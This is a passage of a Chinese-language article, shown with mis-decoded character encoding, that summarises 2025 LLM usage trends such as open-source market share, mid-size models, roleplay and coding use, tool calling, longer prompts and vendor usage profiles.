<p>å¼€æºæ¨¡å‹å¸‚åœºåœ¨è¿‡å»ä¸€å¹´å‘ç”Ÿäº†å‰§å˜ã€‚è™½ç„¶ DeepSeek åœ¨æ€»æµé‡ä¸Šä¾ç„¶é¢†å…ˆï¼Œä½†å®ƒæ›¾ç»å æ®â€œåŠå£æ±Ÿå±±â€ï¼ˆè¶…è¿‡ 50%ï¼‰çš„ç»Ÿæ²»åœ°ä½å·²è¢«æ‰“ç ´ã€‚åˆ°äº† 2025 å¹´åº•ï¼Œæ²¡æœ‰ä»»ä½•å•ä¸€æ¨¡å‹èƒ½ç‹¬å è¶…è¿‡ <code>25%</code> çš„ä»½é¢ï¼Œå‰å‡ åçš„å·®è·æ­£åœ¨ç¼©å°ï¼Œå¸‚åœºå˜å¾—æ›´åŠ å‡è¡¡ã€‚</p>
</li>
<li>
<p>æ–°æ™‹â€œé»‘é©¬â€ä¸Šä½ç¥é€Ÿ ç”¨æˆ·åˆ‡æ¢æ¨¡å‹çš„é—¨æ§›å¾ˆä½ï¼Œä¸”éå¸¸ä¹æ„å°é²œã€‚åƒ <code>Qwenã€MiniMaxã€Kimi</code> ä»¥åŠ <code>GPT-OSS</code> ç­‰æ–°æ¨¡å‹ï¼Œä¸€ç»å‘å¸ƒå°±èƒ½åœ¨å‡ å‘¨å†…è¿…é€ŸæŠ¢å å¤§é‡å¸‚åœºä»½é¢ã€‚è¿™è¯´æ˜åªè¦æ¨¡å‹åœ¨èƒ½åŠ›æˆ–æ•ˆç‡ä¸Šæœ‰çªç ´ï¼Œå°±èƒ½ç«‹åˆ»è·å¾—ç¤¾åŒºçš„è®¤å¯ã€‚</p>
</li>
<li>
<p>æŒç»­è¿­ä»£æ˜¯ç”Ÿå­˜çš„å…³é”®ï¼Œåœ¨è¿™ä¸ªç«äº‰æ¿€çƒˆçš„ç”Ÿæ€é‡Œï¼Œâ€œåƒè€æœ¬â€ è¡Œä¸é€šã€‚<code>DeepSeek</code> ä¹‹æ‰€ä»¥èƒ½åœ¨æ–°ç§€è¾ˆå‡ºçš„ç¯å¢ƒä¸‹ä¾ç„¶ä¿æŒå¤´éƒ¨åœ°ä½ï¼Œå…¨é ä¸æ–­æ¨å‡ºæ–°ç‰ˆæœ¬ã€‚åä¹‹ï¼Œé‚£äº›åœæ­¢æ›´æ–°æˆ–è¿­ä»£ç¼“æ…¢çš„æ¨¡å‹ï¼Œå…¶å¸‚åœºä»½é¢å¾ˆå¿«å°±ä¼šè¢«æ›´å‹¤å¥‹çš„ç«äº‰å¯¹æ‰‹ç“œåˆ†ã€‚</p>
</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€å¼€æºæ¨¡å‹å°ºå¯¸æ–°é£å‘ï¼šâ€œä¸­å‹â€å´›èµ·ï¼Œâ€œå°å‹â€å¤±å® </h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68ad1795535c4915829f792d0e26277e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ky5QOrfYhPezZvvrhQ6J0rCVymM%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>è™½ç„¶å¸‚é¢ä¸Šä¸æ–­æ¶Œç°æ–°çš„å°æ¨¡å‹ï¼ˆ15B å‚æ•°ä»¥ä¸‹ï¼‰ï¼Œä½†å®ƒä»¬çš„ä½¿ç”¨ä»½é¢åè€Œåœ¨ä¸‹é™ã€‚è¿™ä¸ªèµ›é“æå…¶æ‹¥æŒ¤ï¼Œç”¨æˆ·å¿ è¯šåº¦å¾ˆä½ï¼Œæ€»æ˜¯åœ¨ä¸æ–­å°è¯•æ–°å‡ºçš„æ¨¡å‹ï¼ˆå¦‚ Google Gemma 3 ç­‰ï¼‰ï¼Œå¯¼è‡´æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå°æ¨¡å‹èƒ½é•¿æœŸåç¨³ä½ç½®ã€‚</p>
</li>
<li>
<p>â€œä¸­å‹æ¨¡å‹â€ï¼ˆ15B åˆ° 70B å‚æ•°ï¼‰æˆäº†å¸‚åœºçš„æ–°å® ã€‚è‡ªä» Qwen2.5 Coder 32B è¯æ˜äº†è¿™ä¸ªé‡çº§çš„æ½œåŠ›åï¼ŒMistral å’Œ GPT-OSS ç­‰åç»­è·Ÿè¿›è€…è¿…é€Ÿæ‰©å¤§äº†è¿™ä¸€å¸‚åœºã€‚ç”¨æˆ·å‘ç°ï¼Œè¿™ç±»æ¨¡å‹åœ¨<strong>èƒ½åŠ›</strong>å’Œ<strong>è¿è¡Œæ•ˆç‡</strong>ä¹‹é—´æ‰¾åˆ°äº†å®Œç¾çš„å¹³è¡¡ï¼Œæ€§ä»·æ¯”æé«˜ã€‚</p>
</li>
<li>
<p>åœ¨å¤§æ¨¡å‹ï¼ˆ70B å‚æ•°ä»¥ä¸Šï¼‰é¢†åŸŸï¼Œä¸å†æ˜¯æŸä¸€ä¸ªæ¨¡å‹â€œèµ¢å®¶é€šåƒâ€ã€‚ç°åœ¨çš„è¶‹åŠ¿æ˜¯<strong>ç™¾èŠ±é½æ”¾</strong>ï¼Œç”¨æˆ·ä¼šåŒæ—¶ä½¿ç”¨å’Œè¯„ä¼°å¤šä¸ªé¡¶çº§æ¨¡å‹ï¼ˆå¦‚ Qwen3ã€GLM 4.5ã€GPT-OSS-120B ç­‰ï¼‰ï¼Œæ ¹æ®å®é™…è¡¨ç°çµæ´»åˆ‡æ¢ï¼Œè€Œä¸æ˜¯æ­»å®ˆå•ä¸€æ ‡å‡†ã€‚</p>
</li>
</ul>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼Œå°æ¨¡å‹ä¸»å¯¼å¼€æºç”Ÿæ€çš„æ—¶ä»£å¯èƒ½å·²ç»ç»“æŸäº†ã€‚ç°åœ¨çš„å¸‚åœºæ­£åœ¨åˆ†åŒ–ï¼šç”¨æˆ·è¦ä¹ˆè½¬å‘<strong>æ›´ç¨³å¥çš„ä¸­å‹æ¨¡å‹</strong>ä»¥æ±‚å¹³è¡¡ï¼Œè¦ä¹ˆç›´æ¥ä¸Š<strong>å¤§æ¨¡å‹</strong>ä»¥æ±‚æè‡´æ€§èƒ½ã€‚</p>
</blockquote>
<h2 data-id="heading-3">å››ã€å¼€æºæ¨¡å‹çš„ä¸»è¦ç”¨é€”ä¸åº”ç”¨è¶‹åŠ¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48165b0273e347a399f9417abc4ab30c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=2IEvJkPfLzKfkXZYYtCn0kSX6lY%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>ç›®å‰çš„å¼€æºæ¨¡å‹å¹¶éé›¨éœ²å‡æ²¾ï¼Œè€Œæ˜¯é›†ä¸­åœ¨<strong>è§’è‰²æ‰®æ¼”ï¼ˆRoleplayï¼‰<strong>å’Œ</strong>ç¼–ç¨‹è¾…åŠ©</strong>è¿™ä¸¤ä¸ªé¢†åŸŸã€‚è¿™ä¸¤ç±»ä»»åŠ¡å æ®äº†ç»å¤§å¤šæ•°çš„ Token ç”¨é‡ã€‚å°¤å…¶æ˜¯è§’è‰²æ‰®æ¼”ï¼Œå æ®äº†æ€»æµé‡çš„åŠå£æ±Ÿå±±ï¼ˆè¶…è¿‡ 50%ï¼‰ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºå¼€æºæ¨¡å‹é€šå¸¸å—åˆ°çš„å†…å®¹å®¡æŸ¥é™åˆ¶è¾ƒå°‘ï¼Œæ›´é€‚åˆéœ€è¦åˆ›æ„ã€æƒ…æ„Ÿäº’åŠ¨æˆ–ä¸ªæ€§åŒ–å®šåˆ¶çš„å¨±ä¹åœºæ™¯ã€‚</p>
</li>
<li>
<p>å¦‚æœæŠŠç›®å…‰èšç„¦åœ¨ä¸­å›½å¼€å‘çš„å¼€æºæ¨¡å‹ï¼ˆå¦‚ Qwen å’Œ DeepSeekï¼‰ä¸Šï¼Œä¼šå‘ç°å®ƒä»¬çš„ä½¿ç”¨ç»“æ„æœ‰æ‰€ä¸åŒã€‚è™½ç„¶è§’è‰²æ‰®æ¼”ä»æ˜¯ç¬¬ä¸€å¤§ç±»ï¼Œä½†<strong>ç¼–ç¨‹å’ŒæŠ€æœ¯ç±»ä»»åŠ¡</strong>çš„åˆè®¡å æ¯”ï¼ˆçº¦ 39%ï¼‰æ˜¾è‘—é«˜äºå…¨çƒå¹³å‡æ°´å¹³ã€‚è¿™è¯´æ˜å›½äº§å¼€æºæ¨¡å‹æ­£è¶Šæ¥è¶Šå¤šåœ°è¢«ç”¨äºå®é™…çš„ä»£ç ç”Ÿæˆå’Œç”Ÿäº§åŠ›å·¥å…·ä¸­ï¼Œè€Œä¸ä»…ä»…æ˜¯å¨±ä¹ã€‚</p>
</li>
<li>
<p>åœ¨å†™ä»£ç è¿™ä»¶äº‹ä¸Šï¼Œè™½ç„¶é—­æºæ¨¡å‹ï¼ˆå¦‚ Claudeï¼‰ä¾ç„¶å æ®æ•´ä½“ä¸»å¯¼åœ°ä½ï¼Œä½†åœ¨å¼€æºé¢†åŸŸå†…éƒ¨ï¼Œç«äº‰éå¸¸åŠ¨æ€ã€‚å¼€å‘è€…éå¸¸åŠ¡å®ï¼Œâ€œè°å¼ºç”¨è°â€ â€”â€” æµé‡æ›¾åœ¨ 2025 å¹´ä¸­æœŸå‘å›½äº§æ¨¡å‹å€¾æ–œï¼Œéšååˆå› è¥¿æ–¹æ¨¡å‹ï¼ˆå¦‚ LLaMA ç³»åˆ—ï¼‰çš„æ›´æ–°è€Œå›æµã€‚è¿™è¡¨æ˜å¼€æºç¼–ç¨‹åŠ©æ‰‹çš„å¸‚åœºä»½é¢å¯¹æ¨¡å‹è´¨é‡çš„ååº”æå…¶æ•æ„Ÿã€‚</p>
</li>
</ul>
<h2 data-id="heading-4">äº”ã€æ™ºèƒ½ä½“æ¨ç†çš„å´›èµ·</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8338f4a3c8e4260a1282516dfbbcd7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=hewB%2Bmz5aoxSZge5jI6TDTJm46Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æ¨¡å‹ä¸å†ä»…ä»…ç”¨äºç®€å•çš„å•è½®æ–‡æœ¬ç”Ÿæˆæˆ–è¡¥å…¨ï¼Œè€Œæ˜¯è¶Šæ¥è¶Šå¤šåœ°è¢«ç”¨äºæ‰§è¡Œ<strong>å¤šæ­¥éª¤è§„åˆ’ã€å·¥å…·è°ƒç”¨ä»¥åŠå¤æ‚çš„é€»è¾‘æ¨ç†ä»»åŠ¡</strong>ã€‚è¿™æ ‡å¿—ç€ AI ä»å•çº¯çš„â€œèŠå¤©æœºå™¨äººâ€å‘èƒ½è§£å†³å¤æ‚é—®é¢˜çš„â€œæ™ºèƒ½ä½“â€è¿›åŒ–ã€‚</p>
</li>
<li>
<p>è‡ª 2025 å¹´åˆä»¥æ¥ï¼Œæµç»â€œæ¨ç†ä¼˜åŒ–å‹æ¨¡å‹â€çš„ Token ä»½é¢æ€¥å‰§ä¸Šå‡ï¼Œç›®å‰å·²<strong>è¶…è¿‡æ€»æµé‡çš„ 50%</strong>ã€‚è¿™å¾—ç›Šäºä¾›ç»™ä¾§ï¼ˆGPT-5ã€Claude 4.5ã€Gemini 3 ç­‰å¼ºåŠ›æ¨¡å‹çš„å‘å¸ƒï¼‰å’Œéœ€æ±‚ä¾§ï¼ˆç”¨æˆ·å¯¹å¤„ç†å¤æ‚çŠ¶æ€å’Œé€»è¾‘çš„éœ€æ±‚å¢åŠ ï¼‰çš„åŒé‡æ¨åŠ¨ã€‚</p>
</li>
</ul>
<h2 data-id="heading-5">å…­ã€å·¥å…·è°ƒç”¨åŠ é€Ÿæ™®åŠ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55e1d57d2de247dab7ab74410da94c27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=11JSUUVw9epmLxgI32Kh1JAjnWQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æ•°æ®æ˜¾ç¤ºï¼Œå…¨å¹´çš„â€œå·¥å…·å®é™…è°ƒç”¨é‡â€ï¼ˆå³æ¨¡å‹çœŸæ­£æ‰§è¡Œäº†å¤–éƒ¨å·¥å…·æ“ä½œï¼Œè€Œéä»…ä»…æ˜¯å…·å¤‡è¯¥åŠŸèƒ½ï¼‰å‘ˆç°å‡ºæŒç»­ã€ç¨³æ­¥çš„ä¸Šå‡è¶‹åŠ¿ã€‚é™¤å» 5 æœˆä»½å› ä¸ªåˆ«å¤§æˆ·é€ æˆçš„çŸ­æš‚æ•°æ®å¼‚å¸¸å¤–ï¼Œæ•´ä½“è¶‹åŠ¿éå¸¸æ˜ç¡®ï¼šAI æ­£åœ¨ä»å•çº¯çš„å¯¹è¯è€…ï¼Œè½¬å˜ä¸ºèƒ½å¹²æ´»çš„æ‰§è¡Œè€…ã€‚</p>
</li>
<li>
<p>åœ¨ 2025 å¹´åˆï¼Œå·¥å…·è°ƒç”¨é¢†åŸŸåŸºæœ¬è¢« OpenAIï¼ˆgpt-4o-miniï¼‰å’Œ Anthropicï¼ˆClaude 3.5/3.7 ç³»åˆ—ï¼‰å„æ–­ã€‚ä½†åˆ°äº†ä¸‹åŠå¹´ï¼Œå±€é¢å‘ç”Ÿäº†æ˜¾è‘—å˜åŒ–ï¼š<strong>Claude 4.5 Sonnet</strong> è¿…é€ŸæŠ¢å å¸‚åœºä»½é¢ï¼ŒåŒæ—¶ <strong>Grok Code Fast</strong> å’Œ <strong>GLM 4.5</strong> ç­‰æ–°æ¨¡å‹ä¹Ÿå¼ºåŠ¿å…¥å±€ã€‚è¿™è¡¨æ˜æ”¯æŒ Agent èƒ½åŠ›çš„åº•å±‚æ¨¡å‹é€‰æ‹©å˜å¾—æ›´åŠ ä¸°å¯Œäº†ã€‚</p>
</li>
<li>
<p>å¯¹äºå¼€å‘è€…å’Œä¼ä¸šè€Œè¨€ï¼Œç»“è®ºéå¸¸æ®‹é…·ä¸”ç›´æ¥ï¼š<strong>æ”¯æŒç¨³å®šçš„å·¥å…·è°ƒç”¨å·²ä¸å†æ˜¯é”¦ä¸Šæ·»èŠ±ï¼Œè€Œæ˜¯å¿…é¡»é¡¹ã€‚</strong> åœ¨é«˜ä»·å€¼çš„å¤æ‚å·¥ä½œæµä¸­ï¼Œå¦‚æœæ¨¡å‹ç¼ºä¹å¯é çš„å·¥å…·æ¥å£èƒ½åŠ›ï¼Œå°†åœ¨ä¼ä¸šçº§é‡‡ç”¨å’Œè‡ªåŠ¨åŒ–ç¼–æ’ä¸­è¿…é€Ÿæ‰é˜Ÿã€‚</p>
</li>
</ul>
<h2 data-id="heading-6">ä¸ƒã€æ¨¡å‹è¾“å…¥é•¿åº¦æ˜¾è‘—å¢é•¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19cdad53b0954da29f89a93928e73c0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=YB6rI7pX%2FrXZ0ykycylB4%2FeejTU%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>è¿‡å»ä¸€å¹´ï¼Œç”¨æˆ·è¾“å…¥çš„æç¤ºè¯ï¼ˆPromptï¼‰å¹³å‡é•¿åº¦ <strong>ç¿»äº†è¿‘ 4 å€</strong>ï¼ˆä»çº¦ 1.5k æ¶¨è‡³ 6k tokenï¼‰ï¼Œè€Œæ¨¡å‹è¾“å‡ºçš„é•¿åº¦è™½ç„¶ä¹Ÿå¢åŠ äº† 3 å€ï¼ˆä¸»è¦å½’å› äºæ¨ç†è¿‡ç¨‹ï¼‰ï¼Œä½†ç»å¯¹å€¼ä¾ç„¶è¾ƒå°ã€‚è¿™è¯´æ˜ç°åœ¨çš„äº¤äº’æ¨¡å¼æ˜¯â€œå–‚ç»™æ¨¡å‹å¤§é‡ä¿¡æ¯ï¼Œæ¢å–ç²¾ç‚¼çš„é«˜ä»·å€¼æ´å¯Ÿâ€ã€‚</p>
</li>
<li>
<p>è¿™ç§æ•°æ®å½¢æ€çš„å˜åŒ–åæ˜ äº†æ¨¡å‹è§’è‰²çš„æ ¹æœ¬æ€§è½¬ç§»ã€‚AI ä¸å†åªæ˜¯å‡­ç©ºâ€œå†™ä½œæ–‡â€çš„ç”Ÿæˆå™¨ï¼Œè€Œæ˜¯è¿›åŒ–æˆäº†<strong>åˆ†æå¼•æ“</strong>ã€‚ç°åœ¨çš„å…¸å‹ç”¨æ³•æ˜¯ä¸¢ç»™æ¨¡å‹å¤§é‡çš„ä»£ç åº“ã€æ–‡æ¡£æˆ–é•¿å¯¹è¯è®°å½•ï¼Œè®©å®ƒåœ¨è¿™äº›åºå¤§çš„ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œæ¨ç†å’Œæç‚¼ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9a9ecfce13b4a1fbf6c8676be489468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=JNYxFH1UnBSY0faFXRZV4GTF98c%3D" alt="" loading="lazy"/></p>
<ul>
<li>è¾“å…¥é•¿åº¦çš„æš´æ¶¨å¹¶éå…¨è¡Œä¸šçš„æ™®éç°è±¡ï¼Œè€Œæ˜¯å‘ˆç°å‡ºæåº¦çš„ä¸å‡è¡¡æ€§ã€‚<strong>ç¼–ç¨‹ç±»ä»»åŠ¡</strong>ï¼ˆå¦‚ä»£ç ç†è§£ã€è°ƒè¯•ï¼‰æ˜¯æ¨é«˜è¾“å…¥é•¿åº¦çš„ç»å¯¹æ ¸å¿ƒé©±åŠ¨åŠ›ï¼Œå…¶è¯·æ±‚å¾€å¾€éœ€è¦å¤„ç†è¶…è¿‡ 2 ä¸‡ä¸ª Token çš„ä¸Šä¸‹æ–‡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå…¶ä»–é¢†åŸŸçš„è¾“å…¥é•¿åº¦åˆ™ä¿æŒç›¸å¯¹å¹³ç¨³ã€‚</li>
</ul>
<h2 data-id="heading-7">å…«ã€LLM ç¼–ç¨‹ä»»åŠ¡çš„çˆ†å‘å¼å¢é•¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c95884e5d654eefa2bf52bb46f5d5a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=NpGTcUbbn6uuY9zELSRCPyXtwfU%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¦‚æœæŠŠè§†é‡ä»å¼€æºæ¨¡å‹æ‰©å¤§åˆ°æ‰€æœ‰ LLMï¼ˆåŒ…å«é—­æºï¼‰ï¼Œ<strong>ç¼–ç¨‹</strong>æ— ç–‘æ˜¯å¢é•¿æœ€å¿«ä¸”æœ€å…·ç»Ÿæ²»åŠ›çš„ç±»åˆ«ã€‚ä» 2025 å¹´åˆä»…å çº¦ 11% çš„ä»½é¢ï¼Œé£™å‡è‡³æœ€è¿‘çš„è¶…è¿‡ 50%ã€‚è¿™è¯´æ˜ AI å·²ç»æ·±åº¦åµŒå…¥åˆ°å†™ä»£ç ã€è°ƒè¯•ç­‰å¼€å‘æµç¨‹ä¸­ï¼Œä¸å†åªæ˜¯é™ªèŠï¼Œè€Œæ˜¯å®æ‰“å®çš„ç”Ÿäº§åŠ›å·¥å…·ã€‚</p>
</li>
<li>
<p>åœ¨ç¼–ç¨‹è¾…åŠ©é¢†åŸŸï¼ŒAnthropic çš„ <strong>Claude ç³»åˆ—</strong> å…·æœ‰ç»å¯¹çš„ç»Ÿæ²»åŠ›ï¼Œé•¿æœŸæŠŠæŒç€è¶…è¿‡ 60% çš„å¸‚åœºä»½é¢ã€‚ä¸è¿‡ï¼Œè¿™ä¸€åœ°ä½è¿‘æœŸæœ‰æ‰€æ¾åŠ¨ï¼ˆé¦–æ¬¡è·Œç ´ 60%ï¼‰ï¼Œæ˜¾ç¤ºå‡ºå¸‚åœºç«äº‰æ­£åœ¨åŠ å‰§ã€‚</p>
</li>
<li>
<p>ç«äº‰æ ¼å±€æ­£åœ¨å‘ç”Ÿå¾®å¦™å˜åŒ–ï¼šOpenAI çš„ä»½é¢ä» 2% ç¼“æ…¢å›å‡è‡³ 8%ï¼ŒGoogle ç¨³å®šåœ¨ 15% å·¦å³ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<strong>MiniMax</strong> ç­‰æ–°å…´å‚å•†ä»¥åŠ Qwenã€Mistral ç­‰å¼€æºåŠ›é‡æ­£åœ¨è¿…é€Ÿå´›èµ·ï¼ŒæŠ¢å äº†éƒ¨åˆ†å¼€å‘è€…çš„æ³¨æ„åŠ›ã€‚</p>
</li>
</ul>
<blockquote>
<p>ç¼–ç¨‹ç±»ä»»åŠ¡æ˜¯ç›®å‰äº‰å¤ºæœ€æ¿€çƒˆã€æˆ˜ç•¥æ„ä¹‰æœ€é‡è¦çš„é¢†åŸŸã€‚å¼€å‘è€…å¯¹æ¨¡å‹è´¨é‡æå…¶æ•æ„Ÿï¼Œå¾®å°çš„æ€§èƒ½æˆ–å»¶è¿Ÿå·®å¼‚å°±èƒ½å¯¼è‡´å¸‚åœºä»½é¢çš„å¿«é€Ÿè½¬ç§»ã€‚è¿™å€’é€¼æ‰€æœ‰æ¨¡å‹å‚å•†å¿…é¡»æŒç»­åŠ å¼ºä»£ç è®­ç»ƒæ•°æ®å’Œé€»è¾‘æ¨ç†èƒ½åŠ›ï¼Œè°æ…¢ä¸€æ­¥å°±ä¼šæ‰é˜Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-8">ä¹ã€LLM å…¶ä»–ä»»åŠ¡çš„ç»†åˆ†è¶‹åŠ¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f90e67a99f0d425888910d7e72745954~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=iptTFL3yLTzjycn26UaUAfHDtjQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¤§å¤šæ•°åº”ç”¨ç±»åˆ«å†…éƒ¨å¹¶éâ€œé›¨éœ²å‡æ²¾â€ï¼Œè€Œæ˜¯å‘ˆç°å‡ºæ˜æ˜¾çš„<strong>å¤´éƒ¨é›†ä¸­æ•ˆåº”</strong>ã€‚ç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯éå¸¸å›ºå®šï¼Œé€šå¸¸èšç„¦åœ¨æ¯ä¸ªå¤§ç±»ä¸‹çš„æŸè¿™ä¸€ä¸¤ä¸ªç‰¹å®šç»†åˆ†åœºæ™¯ä¸­ï¼Œè¿™è¯´æ˜çœŸå®çš„å¸‚åœºéœ€æ±‚å…¶å®æ˜¯éå¸¸å…·ä½“ä¸”æœ‰è¿¹å¯å¾ªçš„ã€‚</p>
</li>
<li>
<p><strong>è§’è‰²æ‰®æ¼”ï¼ˆRoleplayï¼‰ï¼š</strong> ç»éç®€å•çš„é—²èŠã€‚è¿‘ 60% çš„æµé‡é›†ä¸­åœ¨<strong>æ¸¸æˆä¸è·‘å›¢ï¼ˆGames/RPGï¼‰</strong>ï¼ŒåŠ ä¸Šæˆäººå†…å®¹å’Œå†™ä½œèµ„æºï¼Œè¯´æ˜ç”¨æˆ·æ˜¯åœ¨æŠŠ LLM å½“ä½œä¸€ä¸ªç»“æ„åŒ–çš„æ•…äº‹å¼•æ“æˆ–äº’åŠ¨æ¸¸æˆæœºæ¥ç”¨ã€‚</p>
</li>
<li>
<p>ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡æ˜¯ï¼Œåœ¨â€œç§‘å­¦ï¼ˆScienceï¼‰â€è¿™ä¸ªå¤§ç±»ä¸‹ï¼Œç«Ÿç„¶æœ‰ <strong>80.4%</strong> çš„å†…å®¹æ˜¯å…³äº <strong>â€œæœºå™¨å­¦ä¹ ä¸ AIâ€</strong> çš„ã€‚è¿™è¯´æ˜ç›®å‰ç”¨æˆ·ç”¨ AI èŠç§‘å­¦ï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†ç ”ç©¶ AI æŠ€æœ¯æœ¬èº«ï¼ˆå¥—å¨ƒäº†ï¼‰ï¼Œè€Œä¸æ˜¯å»æ¢ç´¢ç‰©ç†ã€ç”Ÿç‰©ç­‰ä¼ ç»ŸåŸºç¡€å­¦ç§‘ã€‚</p>
</li>
<li>
<p>ç›¸æ¯”äºç¼–ç¨‹çš„æˆç†Ÿï¼Œ<strong>åŒ»ç–—ã€é‡‘èå’Œæ³•å¾‹</strong>ç­‰ä¸“ä¸šé¢†åŸŸçš„åº”ç”¨æ˜¾å¾—éå¸¸åˆ†æ•£ï¼ˆç¢ç‰‡åŒ–ï¼‰ã€‚åœ¨è¿™äº›é¢†åŸŸä¸­ï¼Œæ²¡æœ‰ä»»ä½•å•ä¸€çš„ç»†åˆ†ç”¨é€”èƒ½å æ®ä¸»å¯¼åœ°ä½ã€‚è¿™æ—¢åæ˜ äº†ä¸“ä¸šé¢†åŸŸéœ€æ±‚çš„å¤æ‚æ€§ï¼Œä¹Ÿæš—ç¤ºäº†ç›®å‰çš„é€šç”¨æ¨¡å‹è¿˜æ²¡èƒ½ä¸ºè¿™äº›è¡Œä¸šæä¾›ä¸€å¥—æ ‡å‡†åŒ–çš„ã€æ€æ‰‹çº§çš„å·¥ä½œæµï¼Œæœªæ¥ä¼˜åŒ–æ½œåŠ›å·¨å¤§ã€‚</p>
</li>
</ul>
<h2 data-id="heading-9">åã€æ¨¡å‹å‚å•†çš„ç”Ÿæ€ç”»åƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03dbc0d2c1a14edfa8b3f2a80f9b2b11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=esQqdoyjjaEa3cGvvpixPRJ7n7I%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Anthropic (Claude)ï¼šæè‡´çš„â€œåç§‘ç”Ÿâ€</strong>
Claude çš„å®šä½éå¸¸æ¸…æ™°ä¸”ç¡¬æ ¸â€”â€”å®ƒå°±æ˜¯ç”Ÿäº§åŠ›å·¥å…·ã€‚<strong>è¶…è¿‡ 80%</strong> çš„æµé‡éƒ½é›†ä¸­åœ¨<strong>ç¼–ç¨‹å’ŒæŠ€æœ¯</strong>ä»»åŠ¡ä¸Šï¼Œç”¨æ¥é—²èŠæˆ–è§’è‰²æ‰®æ¼”çš„æ¯”ä¾‹å¾®ä¹å…¶å¾®ã€‚åœ¨å¼€å‘è€…å’Œä¼ä¸šçœ¼ä¸­ï¼Œå®ƒæ˜¯è§£å†³å¤æ‚é€»è¾‘å’Œå†™ä»£ç çš„é¦–é€‰ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0c1d4cfc43b4ab49ac16f2024d6e00e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=I6HyEOvMB5pHVnWmEFXuzfvQHuw%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>DeepSeek vs. Qwen</strong> è™½ç„¶éƒ½æ˜¯å›½äº§å¼€æºä¹‹å…‰ï¼Œä½†ä¸¤è€…çš„ç”¨æ³•æˆªç„¶ä¸åŒï¼š
<ul>
<li><strong>DeepSeek</strong> ï¼šè¶…è¿‡ä¸‰åˆ†ä¹‹äºŒçš„æµé‡éƒ½ç”¨äº<strong>è§’è‰²æ‰®æ¼”å’Œä¼‘é—²èŠå¤©</strong>ï¼Œä¸»æ‰“é«˜é¢‘äº’åŠ¨çš„ C ç«¯åœºæ™¯ã€‚</li>
